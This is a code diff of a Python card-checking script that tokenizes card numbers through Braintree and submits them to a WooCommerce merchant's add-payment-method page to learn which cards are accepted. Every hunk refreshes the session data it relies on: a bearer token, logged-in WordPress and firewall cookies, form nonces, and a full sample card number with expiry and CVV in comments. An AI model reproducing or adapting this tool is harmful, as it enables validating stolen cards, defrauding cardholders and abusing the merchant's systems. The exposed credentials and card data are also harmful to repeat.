@@ -16,7 +16,7 @@ def Tele(ccx):
     headers = {
         'accept': '*/*',
         'accept-language': 'en-US,en;q=0.9',
-        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU1ODMyNDYsImp0aSI6IjEwMWU0ZGE0LTk2ZDktNDEyNC1hNGQzLTg0NjY1YTg1Njk2NCIsInN1YiI6Im1rbWZiaGI2ZDJoOTUzcXciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im1rbWZiaGI2ZDJoOTUzcXciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.L09R-8zZ2yj7H9UViHDw_jIe_38eSoZCobFCqgC8VwC520SiOE4y7mC4AOGLDWS8rZIQiHe2vsrNmGo_edmTZw',
+        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU3ODg1NDQsImp0aSI6IjAzNzZmMDY2LWUyZWYtNGFkNy1iODIwLTBmMTNlNjFhYzQ5NyIsInN1YiI6Im1rbWZiaGI2ZDJoOTUzcXciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im1rbWZiaGI2ZDJoOTUzcXciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.w2ZMm8mM6WxQv3DmImxzgMn49TjyUezD9SHqzwX8sGmu4bg7DH-gG9PedjaA-KAqxkKS9EI6x774mhGDHz6GWw',
         'braintree-version': '2018-05-10',
         'content-type': 'application/json',
         'origin': 'https://assets.braintreegateway.com',
@@ -35,13 +35,13 @@ def Tele(ccx):
         'clientSdkMetadata': {
             'source': 'client',
             'integration': 'custom',
-            'sessionId': 'ce8df233-cadb-4610-9846-3d4abef623e8',
+            'sessionId': '6739cdd7-7c10-4dd3-8162-1af79beba561',
         },
         'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
         'variables': {
             'input': {
                 'creditCard': {
-                    'number': n,
+                    'number':n,
                     'expirationMonth':mm,
                     'expirationYear':yy,
                     'cvv':cvc,
@@ -58,37 +58,41 @@ def Tele(ccx):
 
     # Note: json_data will not be serialized by requests
     # exactly as it was in the original request.
-    #data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"ce8df233-cadb-4610-9846-3d4abef623e8"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4268070334128156","expirationMonth":"11","expirationYear":"2025","cvv":"255"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+    #data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"6739cdd7-7c10-4dd3-8162-1af79beba561"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5356660583453220","expirationMonth":"12","expirationYear":"2029","cvv":"565"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
     #response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
 
     tok=(response.json()['data']['tokenizeCreditCard']['token'])
+
     import requests
 
     cookies = {
         'sbjs_migrations': '1418474375998%3D1',
-        'sbjs_current_add': 'fd%3D2024-09-05%2000%3A38%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_first_add': 'fd%3D2024-09-05%2000%3A38%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29',
+        'sbjs_current_add': 'fd%3D2024-09-07%2009%3A34%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29',
+        'sbjs_first_add': 'fd%3D2024-09-07%2009%3A34%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29',
         'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
         'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
         'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36',
-        '_gcl_au': '1.1.339241898.1725496735',
-        '__utmzz': 'utmccn=(not set)',
-        '__utmzzses': '1',
-        '_gid': 'GA1.2.926604973.1725496736',
-        '_clck': '1uex452%7C2%7Cfox%7C0%7C1709',
-        'brandcdn_uid': '08b37b8c-47e0-4a95-8be6-bb0bee1ca877',
+        'tk_or': '%22%22',
+        'tk_r3d': '%22%22',
+        'tk_lr': '%22%22',
         'pum-61408': 'true',
-        'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': 'xojeddsdo1445%7C1726706385%7CIu8IZU7ZiuEHmZlnjpmQOUh1RRbKNHB8U7S1ZuVOi9C%7C4027ed70af0294f47e29c1e7c11e20d8ae9d8a9edcec2d67eeb1f6f039d16906',
-        'wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee': 'fz4c1m0kew7iwgmncx9k',
+        '_gcl_au': '1.1.2130033564.1725701717',
+        '__utmzz': 'utmcsr=(direct)|utmcmd=(none)|utmccn=(not set)',
+        '__utmzzses': '1',
+        '_gid': 'GA1.2.997527532.1725701769',
+        '_clck': '2b766j%7C2%7Cfoz%7C0%7C1711',
+        'brandcdn_uid': '1aa677e6-3895-4e27-8ed3-7384c94f0202',
+        'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': 'xojedo14kjcxzczk45%7C1726911570%7CtUcx4FIsI6y5QEP0vHREvZnYl1CKzM9QSFmEEWgDBmO%7Ca7c96bef0d734748a1fe787858363093ebe1a1288e574ff4388953ac7bf843b0',
+        'wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee': 'piqjav55smsj3qttly39',
         'wp_automatewoo_session_started': '1',
-        'wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103': '5612%7Cother%7Cread%7Ca3cec835eabb518f993ed3a59fd4d225a3a3799ba43af5e8b9b266a1ced4f34a',
-        'tk_ai': 'smAXd%2BzrJt5iGnflwYPMzyNo',
-        '_ga_JT1Y3HZ65M': 'GS1.1.1725496736.1.1.1725496844.0.0.0',
-        '_ga': 'GA1.2.293097550.1725496736',
+        'wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103': '5651%7Cother%7Cread%7Cff053780a772935a2812ec7fe5d5cc66018fd4e776817006f13a97bc09e068df',
+        'tk_ai': 'vFbc2qyjjZ9EoBj9fBghKGwr',
+        '_ga_JT1Y3HZ65M': 'GS1.1.1725701778.1.1.1725702141.0.0.0',
+        '_ga': 'GA1.2.5488088.1725701769',
         'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F',
-        '_clsk': '1wc5tc0%7C1725496845231%7C7%7C1%7Cx.clarity.ms%2Fcollect',
-        '_uetsid': '301550f06b1f11ef984fbd30192eedf8',
-        '_uetvid': '301598206b1f11ef8b2093208dce4234',
+        '_uetsid': '7ee243006cfc11ef95953921d20d35da',
+        '_uetvid': '7ee280f06cfc11ef8c0e41e8e0e87d5a',
+        '_clsk': '14yu1ie%7C1725702142523%7C5%7C1%7Cw.clarity.ms%2Fcollect',
         'tk_qs': '',
     }
 
@@ -97,7 +101,7 @@ def Tele(ccx):
         'accept-language': 'en-US,en;q=0.9',
         'cache-control': 'max-age=0',
         'content-type': 'application/x-www-form-urlencoded',
-        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-05%2000%3A38%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-05%2000%3A38%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; _gcl_au=1.1.339241898.1725496735; __utmzz=utmccn=(not set); __utmzzses=1; _gid=GA1.2.926604973.1725496736; _clck=1uex452%7C2%7Cfox%7C0%7C1709; brandcdn_uid=08b37b8c-47e0-4a95-8be6-bb0bee1ca877; pum-61408=true; wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee=xojeddsdo1445%7C1726706385%7CIu8IZU7ZiuEHmZlnjpmQOUh1RRbKNHB8U7S1ZuVOi9C%7C4027ed70af0294f47e29c1e7c11e20d8ae9d8a9edcec2d67eeb1f6f039d16906; wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee=fz4c1m0kew7iwgmncx9k; wp_automatewoo_session_started=1; wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103=5612%7Cother%7Cread%7Ca3cec835eabb518f993ed3a59fd4d225a3a3799ba43af5e8b9b266a1ced4f34a; tk_ai=smAXd%2BzrJt5iGnflwYPMzyNo; _ga_JT1Y3HZ65M=GS1.1.1725496736.1.1.1725496844.0.0.0; _ga=GA1.2.293097550.1725496736; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F; _clsk=1wc5tc0%7C1725496845231%7C7%7C1%7Cx.clarity.ms%2Fcollect; _uetsid=301550f06b1f11ef984fbd30192eedf8; _uetvid=301598206b1f11ef8b2093208dce4234; tk_qs=',
+        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-07%2009%3A34%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-07%2009%3A34%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; pum-61408=true; _gcl_au=1.1.2130033564.1725701717; __utmzz=utmcsr=(direct)|utmcmd=(none)|utmccn=(not set); __utmzzses=1; _gid=GA1.2.997527532.1725701769; _clck=2b766j%7C2%7Cfoz%7C0%7C1711; brandcdn_uid=1aa677e6-3895-4e27-8ed3-7384c94f0202; wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee=xojedo14kjcxzczk45%7C1726911570%7CtUcx4FIsI6y5QEP0vHREvZnYl1CKzM9QSFmEEWgDBmO%7Ca7c96bef0d734748a1fe787858363093ebe1a1288e574ff4388953ac7bf843b0; wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee=piqjav55smsj3qttly39; wp_automatewoo_session_started=1; wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103=5651%7Cother%7Cread%7Cff053780a772935a2812ec7fe5d5cc66018fd4e776817006f13a97bc09e068df; tk_ai=vFbc2qyjjZ9EoBj9fBghKGwr; _ga_JT1Y3HZ65M=GS1.1.1725701778.1.1.1725702141.0.0.0; _ga=GA1.2.5488088.1725701769; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F; _uetsid=7ee243006cfc11ef95953921d20d35da; _uetvid=7ee280f06cfc11ef8c0e41e8e0e87d5a; _clsk=14yu1ie%7C1725702142523%7C5%7C1%7Cw.clarity.ms%2Fcollect; tk_qs=',
         'origin': 'https://www.yazoomills.com',
         'priority': 'u=0, i',
         'referer': 'https://www.yazoomills.com/my-account/add-payment-method/',
@@ -114,14 +118,14 @@ def Tele(ccx):
 
     data = {
         'payment_method': 'braintree_credit_card',
-        'wc-braintree-credit-card-card-type': 'visa',
+        'wc-braintree-credit-card-card-type': 'master-card',
         'wc-braintree-credit-card-3d-secure-enabled': '',
         'wc-braintree-credit-card-3d-secure-verified': '',
         'wc-braintree-credit-card-3d-secure-order-total': '0.00',
         'wc_braintree_credit_card_payment_nonce':tok,
-        'wc_braintree_device_data': '{"correlation_id":"297a79a9b4ee83268213b928838cb054"}',
+        'wc_braintree_device_data': '{"correlation_id":"12b585193d37b857fc993854d60c6df3"}',
         'wc-braintree-credit-card-tokenize-payment-method': 'true',
-        'woocommerce-add-payment-method-nonce': '85706526ed',
+        'woocommerce-add-payment-method-nonce': 'ba39b177ff',
         '_wp_http_referer': '/my-account/add-payment-method/',
         'woocommerce_add_payment_method': '1',
     }
@@ -229,4 +233,3 @@ def Tele(ccx):
         success_message = success_message_element.text.strip()
         result = "1000: Approved"
         return "Payment method successfully added."
-
